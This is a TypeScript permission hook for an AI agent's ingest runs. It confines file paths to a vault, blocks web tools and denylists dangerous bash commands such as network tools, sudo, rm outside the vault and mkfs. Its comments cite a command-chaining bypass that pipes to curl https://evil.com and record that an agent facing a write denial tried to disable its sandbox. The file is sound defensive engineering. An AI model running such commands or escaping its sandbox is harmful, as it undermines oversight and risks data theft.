/**
 * Permission enforcement for agent runs (CLAUDE.md hard rule 4).
 *
 * WHY THIS IS A PreToolUse HOOK, NOT `canUseTool`
 * ----------------------------------------------
 * `canUseTool` is advisory and shadowable. Measured against the real SDK
 * (`server/src/cli/permprobe.ts`): a deny-everything `canUseTool` was invoked
 * **zero** times and the canary command executed. The SDK says so itself:
 *
 *   "Bare allowedTools entries auto-approve the whole tool before the callback is
 *    consulted. To gate every tool call, use a PreToolUse hook; ... Allow rules
 *    from settings files can also shadow the callback but are not visible here."
 *
 * A PreToolUse hook IS invoked and DOES block — verified with a side-effect canary
 * (`touch <file>` denied ⇒ no file on disk). So the hook is the boundary; the
 * `canUseTool` callback is kept only as a redundant second layer.
 *
 * WHAT IS ACTUALLY GUARANTEED (rule 4, as clarified with the user 2026-07-17)
 * --------------------------------------------------------------------------
 * Hard, enforceable:
 *   - writes/reads confined to VAULT_ROOT for every path-bearing tool
 *   - no web egress during ingest
 * Best-effort, defense in depth:
 *   - bash is denied for clearly dangerous shapes (network, privilege escalation,
 *     writes outside the vault) and allowed otherwise.
 *
 * The bash layer is deliberately NOT presented as a hard boundary. Deciding what an
 * arbitrary shell string does is not tractable, and the real ingest needs general
 * bash: of the 68 Bash calls in the validated M0 run, 54 were vault `scripts/*.sh`
 * and 14 were exploration (`find`, `ls`, `cat`, `python3`, `&&` chains). A whitelist
 * that only permits `scripts/*.sh` would have blocked that run. Claiming a guarantee
 * we cannot keep would be worse than naming the limit.
 */

import path from 'node:path'
import type { PermissionResult } from '@anthropic-ai/claude-agent-sdk'

/** Web tools are hard-denied for ingest runs (SPEC.md §9; autoresearch re-enables them in M4). */
export const WEB_TOOLS = ['WebSearch', 'WebFetch'] as const

/** Tools whose input names a path we must confine to the vault. */
const PATH_INPUT_KEYS = ['file_path', 'path', 'notebook_path'] as const

/** Vault scripts are always allowed — this is the intended bash surface. */
const VAULT_SCRIPT_COMMAND = /(?:^|[\s;&|(])(?:(?:ba)?sh\s+)?(?:\.\/)?scripts\/[A-Za-z0-9._-]+\.sh(?:\s|$)/

/**
 * Bash shapes refused outright. Best-effort by construction: this is a denylist, and
 * a denylist can be evaded. It exists to catch the obvious, not to be a sandbox.
 */
const BASH_DENY: ReadonlyArray<{ readonly pattern: RegExp; readonly why: string }> = [
  {
    pattern: /(?:^|[\s;&|(])(?:curl|wget|nc|ncat|telnet|ssh|scp|rsync|ftp)(?:\s|$)/,
    why: 'network egress is not permitted during ingest (SPEC.md §9)',
  },
  {
    pattern: /(?:^|[\s;&|(])(?:sudo|su|doas|chmod\s+[0-7]*777|chown)(?:\s|$)/,
    why: 'privilege escalation and ownership changes are not permitted',
  },
  {
    pattern: /(?:^|[\s;&|(])rm\s+(?:-[A-Za-z]*\s+)*(?:\/(?!home\/[^/\s]+\/vault)|~(?!\/vault)|\$HOME(?!\/vault))/,
    why: 'destructive removal outside the vault is not permitted',
  },
  {
    pattern: /(?:^|[\s;&|(])(?:mkfs|dd\s+if=|shutdown|reboot|systemctl|kill(?:all)?)(?:\s|$)/,
    why: 'system-level commands are not permitted',
  },
]

export interface PermissionContext {
  /** Absolute, resolved vault root. */
  readonly vaultRoot: string
}

/** True when `candidate` is inside `root` (or is `root` itself). */
export function isInside(root: string, candidate: string): boolean {
  const rel = path.relative(root, candidate)
  // '' means candidate === root. A '..' prefix or an absolute result means outside.
  return rel === '' || (!rel.startsWith(`..${path.sep}`) && rel !== '..' && !path.isAbsolute(rel))
}

/** Extracts every path-like value from a tool input. */
export function extractPaths(input: Record<string, unknown>): string[] {
  const out: string[] = []
  for (const key of PATH_INPUT_KEYS) {
    const value = input[key]
    if (typeof value === 'string' && value !== '') out.push(value)
  }
  // MultiEdit-style batched edits carry their own path list.
  const edits = input['edits']
  if (Array.isArray(edits)) {
    for (const edit of edits) {
      if (edit && typeof edit === 'object') {
        const value = (edit as Record<string, unknown>)['file_path']
        if (typeof value === 'string' && value !== '') out.push(value)
      }
    }
  }
  return out
}

/** True when the command invokes one of the vault's own scripts. */
export function isVaultScriptCommand(command: string): boolean {
  return VAULT_SCRIPT_COMMAND.test(command.trim())
}

/**
 * Best-effort bash policy. Returns a refusal reason, or undefined to allow.
 * Vault scripts short-circuit to allowed; everything else is checked against the
 * denylist and permitted if nothing matches.
 */
export function bashRefusalReason(command: string): string | undefined {
  const trimmed = command.trim()
  if (trimmed === '') return 'empty command'
  // The denylist runs FIRST, before any vault-script recognition. Short-circuiting
  // on "starts with a vault script" is a bypass: `scripts/wiki-lock.sh list; curl
  // https://evil.com` contains a vault script AND exfiltrates. Being a vault script
  // is never a licence to skip the checks — it only matters if nothing is refused.
  for (const { pattern, why } of BASH_DENY) {
    if (pattern.test(trimmed)) return why
  }
  return undefined
}

/**
 * The single permission decision for one tool call.
 * Path confinement and web egress are hard; bash is best-effort (see file header).
 */
export function decidePermission(
  ctx: PermissionContext,
  toolName: string,
  input: Record<string, unknown>,
): PermissionResult {
  if ((WEB_TOOLS as readonly string[]).includes(toolName)) {
    return {
      behavior: 'deny',
      message: `${toolName} is not available during ingest: ingest runs have no web egress (SPEC.md §9). Work only from the provided source file.`,
    }
  }

  if (toolName === 'Bash') {
    // Belt and braces alongside `sandbox.allowUnsandboxedCommands: false`. The Bash
    // tool ships a `dangerouslyDisableSandbox` escape hatch; an agent that hits a
    // write denial reaches for it (observed). The sandbox setting is what actually
    // neutralises it — this refusal just makes the attempt visible in the log.
    if (input['dangerouslyDisableSandbox'] === true) {
      return {
        behavior: 'deny',
        message:
          'Refused: dangerouslyDisableSandbox is not permitted. Every command runs inside the ' +
          'vault sandbox; work within VAULT_ROOT instead of stepping outside it.',
      }
    }

    const command = input['command']
    if (typeof command !== 'string') {
      return { behavior: 'deny', message: 'Bash called without a string command.' }
    }
    const reason = bashRefusalReason(command)
    if (reason !== undefined) {
      return { behavior: 'deny', message: `Refused: ${reason}. Command: ${command}` }
    }
    return { behavior: 'allow' }
  }

  // Any tool naming a path must stay inside the vault, whatever it is. This is the
  // guarantee that actually protects the vault, and it is enforced without exception.
  for (const raw of extractPaths(input)) {
    const resolved = path.resolve(ctx.vaultRoot, raw)
    if (!isInside(ctx.vaultRoot, resolved)) {
      return {
        behavior: 'deny',
        message:
          `Path is outside the vault and may not be accessed: ${resolved}. ` +
          `All work stays under ${ctx.vaultRoot}.`,
      }
    }
  }

  return { behavior: 'allow' }
}
